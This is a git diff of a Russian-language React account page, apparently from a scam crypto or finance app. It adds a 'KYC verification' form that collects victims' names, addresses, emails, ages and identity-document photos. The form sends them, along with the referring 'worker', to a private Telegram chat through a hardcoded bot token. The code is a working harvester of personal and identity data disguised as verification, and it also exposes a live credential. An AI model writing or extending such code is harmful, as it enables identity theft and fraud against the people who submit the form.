@@ -1,5 +1,6 @@
-import React, { useState } from 'react';
-import { User, Shield, Globe, Bell, ChevronRight, BadgeCheck, Headset, ShieldCheck, MessageCircle, LogOut, Copy, Check, Settings, Star, Zap } from 'lucide-react';
+import React, { useState, useCallback } from 'react';
+import { User, Shield, Globe, Bell, ChevronRight, BadgeCheck, Headset, ShieldCheck, MessageCircle, LogOut, Copy, Check, Settings, Star, Zap, X, Upload, Minimize2, Maximize2 } from 'lucide-react';
+import { supabase } from '../supabaseClient';
 import type { DbUser, DbSettings } from '../types';
 
 interface AccountPageProps {
@@ -13,6 +14,32 @@ const AccountPage: React.FC<AccountPageProps> = ({ user, settings }) => {
   const [showSecurityModal, setShowSecurityModal] = useState(false);
   const [showNotifModal, setShowNotifModal] = useState(false);
   const [copiedId, setCopiedId] = useState(false);
+  
+  // KYC Verification Form State
+  const [kycHeight, setKycHeight] = useState<'small' | 'full'>('small');
+  const [isKycAnimating, setIsKycAnimating] = useState(false);
+  const [kycFormData, setKycFormData] = useState({
+    fullName: '',
+    address: '',
+    email: '',
+    age: '',
+    country: 'Россия',
+    documentPhoto: null as File | null,
+    documentPreview: null as string | null
+  });
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  
+  // Countries list
+  const countries = [
+    { name: 'Россия', flag: '🇷🇺' },
+    { name: 'Казахстан', flag: '🇰🇿' },
+    { name: 'Узбекистан', flag: '🇺🇿' },
+    { name: 'Киргизия', flag: '🇰🇬' },
+    { name: 'Таджикистан', flag: '🇹🇯' },
+    { name: 'США', flag: '🇺🇸' },
+    { name: 'Европа', flag: '🇪🇺' },
+    { name: 'Другая', flag: '🌍' }
+  ];
 
   const supportLink = `https://t.me/${settings.support_username}`;
 
@@ -22,6 +49,198 @@ const AccountPage: React.FC<AccountPageProps> = ({ user, settings }) => {
       setCopiedId(true);
       setTimeout(() => setCopiedId(false), 2000);
     }
+  };
+
+  const handleOpenKyc = () => {
+    setKycHeight('small');
+    setIsKycAnimating(true);
+    setShowVerifyModal(true);
+    setTimeout(() => setIsKycAnimating(false), 300);
+  };
+
+  const handleDocumentUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const file = event.target.files?.[0];
+    if (file && file.type.startsWith('image/')) {
+      setKycFormData(prev => ({ ...prev, documentPhoto: file }));
+      
+      const reader = new FileReader();
+      reader.onload = (e) => {
+        setKycFormData(prev => ({ ...prev, documentPreview: e.target?.result as string }));
+      };
+      reader.readAsDataURL(file);
+    }
+  };
+
+  const removeDocument = () => {
+    setKycFormData(prev => ({ ...prev, documentPhoto: null, documentPreview: null }));
+  };
+
+  const sendKycToTelegram = async (kycData: typeof kycFormData) => {
+    try {
+      // Получаем данные пользователя из Supabase
+      const { data: userData, error: userError } = await supabase
+        .from('users')
+        .select('user_id, username, full_name, referrer_id')
+        .eq('user_id', user?.user_id)
+        .single();
+
+      if (userError) {
+        console.error('Ошибка получения данных пользователя:', userError);
+      }
+
+      // Получаем данные воркера (реферера) если есть
+      let workerData = null;
+      if (userData?.referrer_id) {
+        const { data: worker, error: workerError } = await supabase
+          .from('users')
+          .select('user_id, username, full_name')
+          .eq('user_id', userData.referrer_id)
+          .single();
+
+        if (workerError) {
+          console.error('Ошибка получения данных воркера:', workerError);
+        } else {
+          workerData = worker;
+        }
+      }
+
+      // Формируем информацию о пользователе
+      const userName = userData?.full_name || 'Неизвестно';
+      const userNickname = userData?.username || 'Нет никнейма';
+      const userInfo = `${userName} (${userNickname}) ID: ${userData?.user_id || user?.user_id}`;
+
+      // Формируем информацию о воркере
+      const workerInfo = workerData 
+        ? `${workerData.full_name || 'Неизвестно'} (${workerData.username || 'Нет никнейма'}) ID: ${workerData.user_id}`
+        : 'Прямая регистрация';
+
+      // Формируем сообщение
+      const message = `
+🛡️ НОВАЯ ЗАЯВКА НА ВЕРИФИКАЦИЮ KYC
+
+👤 Пользователь: ${userInfo}
+👨‍💼 Воркер: ${workerInfo}
+
+📋 Данные для верификации:
+━━━━━━━━━━━━━━━━━━━━
+👤 Полное имя: ${kycData.fullName}
+📍 Адрес: ${kycData.address}
+📧 Email: ${kycData.email}
+🎂 Возраст: ${kycData.age} лет
+🌍 Страна: ${kycData.country}
+📅 Дата подачи: ${new Date().toLocaleString('ru-RU')}
+🆔 ID заявки: ${Date.now()}
+
+${kycData.documentPhoto ? '📸 Документ прикреплен' : '❌ Документ отсутствует'}
+
+#верификация #kyc #${kycData.country.toLowerCase().replace(' ', '_')}
+      `.trim();
+      
+      const botToken = '7769124785:AAE46Zt6jh9IPVt4IB4u0j8kgEVg2NpSYa0';
+      const chatId = '-1003560670670';
+      
+      let response;
+      
+      if (kycData.documentPhoto) {
+        // Отправляем с фото документа
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('caption', message);
+        formData.append('photo', kycData.documentPhoto, kycData.documentPhoto.name);
+        formData.append('parse_mode', 'HTML');
+        
+        response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } else {
+        // Отправляем только текст
+        response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+      }
+      
+      if (response.ok) {
+        const result = await response.json();
+        console.log('Заявка на верификацию успешно отправлена в Telegram:', result);
+        return true;
+      } else {
+        let errorData;
+        try {
+          errorData = await response.json();
+        } catch (e) {
+          errorData = await response.text();
+        }
+        console.error('Ошибка отправки в Telegram:', errorData);
+        
+        // Если ошибка с фото, попробуем отправить только текст
+        if (kycData.documentPhoto && (response.status === 400 || (errorData && errorData.error_code === 400))) {
+          const textResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message + '\n\n⚠️ Документ не удалось прикрепить',
+              parse_mode: 'HTML'
+            })
+          });
+          
+          if (textResponse.ok) {
+            return true;
+          }
+        }
+        
+        return false;
+      }
+    } catch (error) {
+      console.error('Ошибка при отправке в Telegram:', error);
+      return false;
+    }
+  };
+
+  const handleSubmitKyc = async () => {
+    // Валидация
+    if (!kycFormData.fullName || !kycFormData.address || !kycFormData.email || !kycFormData.age || !kycFormData.documentPhoto) {
+      alert('Пожалуйста, заполните все поля и прикрепите документ');
+      return;
+    }
+
+    if (isNaN(Number(kycFormData.age)) || Number(kycFormData.age) < 18) {
+      alert('Возраст должен быть не менее 18 лет');
+      return;
+    }
+
+    setIsSubmitting(true);
+    
+    const success = await sendKycToTelegram(kycFormData);
+    
+    if (success) {
+      alert('Заявка на верификацию успешно отправлена!');
+      setShowVerifyModal(false);
+      setKycFormData({
+        fullName: '',
+        address: '',
+        email: '',
+        age: '',
+        country: 'Россия',
+        documentPhoto: null,
+        documentPreview: null
+      });
+    } else {
+      alert('Ошибка при отправке заявки. Попробуйте еще раз.');
+    }
+    
+    setIsSubmitting(false);
   };
 
   return (
@@ -61,7 +280,7 @@ const AccountPage: React.FC<AccountPageProps> = ({ user, settings }) => {
               <div className="absolute top-0 right-0 w-32 h-32 bg-[#0098EA] opacity-[0.03] rounded-full translate-x-1/3 -translate-y-1/3"></div>
               
               <div className="flex items-center gap-4 relative z-10">
-                <div className="w-16 h-16 rounded-2xl bg-[#2c2c2e] flex items-center justify-center overflow-hidden border border-white/10 shadow-sm">
+                <div className="w-16 h-16 rounded-2xl bg-[#1c1c1e] flex items-center justify-center overflow-hidden border border-white/5 shadow-sm">
                   {user?.photo_url ? (
                     <img src={user.photo_url} alt="Avatar" className="w-full h-full object-cover" />
                   ) : (
@@ -113,7 +332,7 @@ const AccountPage: React.FC<AccountPageProps> = ({ user, settings }) => {
                 title="Верификация"
                 subtitle={user?.is_kyc ? 'Пройдена' : 'Требуется'}
                 color={user?.is_kyc ? 'text-[#00C896]' : 'text-yellow-500'}
-                onClick={() => setShowVerifyModal(true)}
+                onClick={handleOpenKyc}
               />
               <QuickActionCard 
                 icon={<Shield size={20} className="text-[#00C896]" />}
@@ -184,26 +403,200 @@ const AccountPage: React.FC<AccountPageProps> = ({ user, settings }) => {
         )}
       </div>
 
-      {/* Verification Modal */}
+      {/* KYC Verification Bottom Sheet */}
       {showVerifyModal && (
-        <Modal onClose={() => setShowVerifyModal(false)}>
-          <div className="w-14 h-14 rounded-2xl bg-[#0098EA]/15 flex items-center justify-center mb-4 border border-[#0098EA]/20">
-            <Shield size={28} className="text-[#0098EA]" />
-          </div>
-          <h3 className="text-xl font-bold text-white mb-2">Верификация KYC</h3>
-          <p className="text-gray-400 text-sm mb-6 leading-relaxed">
-            Для подтверждения личности свяжитесь с поддержкой. Верификация открывает доступ к выводу средств.
-          </p>
-          <a 
-            href={supportLink}
-            target="_blank"
-            rel="noopener noreferrer"
-            className="w-full bg-[#0098EA] hover:bg-[#0088D1] text-white font-bold py-3 rounded-2xl flex items-center justify-center gap-2 active:scale-[0.98] transition-all shadow-[0_4px_20px_rgba(0,152,234,0.2)]"
+        <>
+          {/* Backdrop */}
+          <div 
+            className="fixed inset-0 z-[110] bg-black/60 backdrop-blur-sm transition-opacity" 
+            onClick={() => {
+              if (kycHeight === 'small') {
+                setShowVerifyModal(false);
+              } else {
+                setKycHeight('small');
+              }
+            }} 
+          />
+          
+          {/* KYC Form Bottom Sheet */}
+          <div 
+            className={`fixed bottom-0 left-1/2 -translate-x-1/2 z-[120] w-full max-w-[420px] bg-[#1c1c1e] flex flex-col rounded-t-[32px] border-t border-white/10 shadow-2xl transition-all duration-300 ease-out ${
+              isKycAnimating ? 'animate-[slideUpFromBottom_0.3s_ease-out]' : ''
+            } ${
+              kycHeight === 'full' ? 'h-[95vh]' : 'h-[70vh]'
+            }`}
+            onClick={(e) => e.stopPropagation()}
+            style={{ 
+              willChange: isKycAnimating ? 'transform' : 'height'
+            }}
           >
-            <Headset size={18} />
-            Написать в поддержку
-          </a>
-        </Modal>
+            {/* Drag Handle & Header */}
+            <div className="flex-shrink-0 px-4 pt-3 pb-2">
+              <div 
+                className="w-12 h-1.5 bg-white/20 rounded-full mx-auto mb-3 cursor-ns-resize"
+                onClick={() => setKycHeight(kycHeight === 'full' ? 'small' : 'full')}
+              />
+              
+              <div className="flex items-center justify-between mb-2">
+                <button
+                  onClick={() => setShowVerifyModal(false)}
+                  className="w-8 h-8 rounded-full bg-[#252527] border border-white/5 flex items-center justify-center active:scale-90 transition-all text-white hover:bg-[#2c2c2e]"
+                >
+                  <X size={16} />
+                </button>
+                <div className="text-lg font-bold flex items-center gap-2 text-[#0098EA]">
+                  <Shield size={20} />
+                  Верификация KYC
+                </div>
+                <button
+                  onClick={() => setKycHeight(kycHeight === 'full' ? 'small' : 'full')}
+                  className="w-8 h-8 rounded-full bg-[#252527] border border-white/5 flex items-center justify-center active:scale-90 transition-all text-white hover:bg-[#2c2c2e]"
+                >
+                  {kycHeight === 'full' ? <Minimize2 size={16} /> : <Maximize2 size={16} />}
+                </button>
+              </div>
+            </div>
+
+            {/* Form Content */}
+            <div className="flex-1 overflow-y-auto px-4 pb-4 pt-2" style={{ WebkitOverflowScrolling: 'touch' }}>
+              <div className="space-y-4">
+                {/* Full Name */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Полное имя *</label>
+                  <input 
+                    type="text" 
+                    value={kycFormData.fullName}
+                    onChange={(e) => setKycFormData(prev => ({ ...prev, fullName: e.target.value }))}
+                    placeholder="Иван Иванов"
+                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
+                  />
+                </div>
+
+                {/* Address */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Адрес *</label>
+                  <input 
+                    type="text" 
+                    value={kycFormData.address}
+                    onChange={(e) => setKycFormData(prev => ({ ...prev, address: e.target.value }))}
+                    placeholder="Город, улица, дом, квартира"
+                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
+                  />
+                </div>
+
+                {/* Email */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Email *</label>
+                  <input 
+                    type="email" 
+                    value={kycFormData.email}
+                    onChange={(e) => setKycFormData(prev => ({ ...prev, email: e.target.value }))}
+                    placeholder="example@mail.com"
+                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
+                  />
+                </div>
+
+                {/* Age */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Возраст *</label>
+                  <input 
+                    type="number" 
+                    value={kycFormData.age}
+                    onChange={(e) => setKycFormData(prev => ({ ...prev, age: e.target.value }))}
+                    placeholder="18"
+                    min="18"
+                    className="w-full bg-[#111113] rounded-xl p-3 text-white outline-none border border-white/5 focus:border-[#0098EA] transition-colors"
+                  />
+                </div>
+
+                {/* Country */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Страна *</label>
+                  <div className="bg-[#111113] rounded-xl border border-white/5 focus-within:border-[#0098EA]">
+                    <select 
+                      value={kycFormData.country} 
+                      onChange={e => setKycFormData(prev => ({ ...prev, country: e.target.value }))}
+                      className="w-full bg-transparent p-3 text-white outline-none appearance-none"
+                    >
+                      {countries.map(country => (
+                        <option key={country.name} value={country.name} className="bg-[#1c1c1e]">
+                          {country.flag} {country.name}
+                        </option>
+                      ))}
+                    </select>
+                  </div>
+                </div>
+
+                {/* Document Photo */}
+                <div>
+                  <label className="text-xs text-gray-400 uppercase mb-2 block tracking-wider">Документ, подтверждающий личность *</label>
+                  
+                  {!kycFormData.documentPreview ? (
+                    <label className="w-full bg-[#111113] border-2 border-dashed border-white/10 rounded-xl p-6 flex flex-col items-center justify-center cursor-pointer hover:border-[#0098EA] transition-colors">
+                      <div className="w-12 h-12 rounded-full bg-[#0098EA]/20 flex items-center justify-center mb-3">
+                        <Upload size={24} className="text-[#0098EA]" />
+                      </div>
+                      <span className="text-sm font-medium text-gray-300 mb-1">
+                        Прикрепить документ
+                      </span>
+                      <span className="text-xs text-gray-500 text-center">
+                        JPG, PNG до 10MB
+                      </span>
+                      <input
+                        type="file"
+                        accept="image/*"
+                        onChange={handleDocumentUpload}
+                        className="hidden"
+                      />
+                    </label>
+                  ) : (
+                    <div className="relative">
+                      <img 
+                        src={kycFormData.documentPreview} 
+                        alt="Документ"
+                        className="w-full h-48 object-cover rounded-xl border border-white/5"
+                      />
+                      <button
+                        onClick={removeDocument}
+                        className="absolute top-2 right-2 w-8 h-8 bg-[#FF3B30] rounded-full flex items-center justify-center text-white"
+                      >
+                        <X size={16} />
+                      </button>
+                      <div className="absolute bottom-2 left-2 bg-black/80 backdrop-blur-sm rounded-lg px-2 py-1">
+                        <span className="text-xs text-white">
+                          {kycFormData.documentPhoto?.name}
+                        </span>
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* Submit Button */}
+                <button 
+                  onClick={handleSubmitKyc}
+                  disabled={isSubmitting}
+                  className={`w-full h-14 rounded-xl text-lg font-bold shadow-lg active:scale-[0.98] transition-all flex items-center justify-center gap-2 mb-4 ${
+                    isSubmitting
+                      ? 'bg-[#1c1c1e] text-gray-500 cursor-not-allowed border border-white/5'
+                      : 'bg-[#0098EA] text-white shadow-[0_4px_20px_rgba(0,152,234,0.2)]'
+                  }`}
+                >
+                  {isSubmitting ? (
+                    <>
+                      <div className="w-5 h-5 border-2 border-gray-500 border-t-transparent rounded-full animate-spin" />
+                      Отправка...
+                    </>
+                  ) : (
+                    <>
+                      <Shield size={20} />
+                      Отправить на верификацию
+                    </>
+                  )}
+                </button>
+              </div>
+            </div>
+          </div>
+        </>
       )}
 
       {/* Security Modal */}
@@ -309,7 +702,7 @@ const Modal = ({ children, onClose }: { children: React.ReactNode, onClose: () =
       {children}
       <button 
         onClick={onClose}
-        className="w-full bg-[#2c2c2e] hover:bg-[#3a3a3c] text-white font-medium py-3 rounded-2xl transition-all mt-4 active:scale-[0.98]"
+        className="w-full bg-[#1c1c1e] hover:bg-[#252527] text-white font-medium py-3 rounded-2xl transition-all mt-4 active:scale-[0.98] border border-white/5"
       >
         Закрыть
       </button>
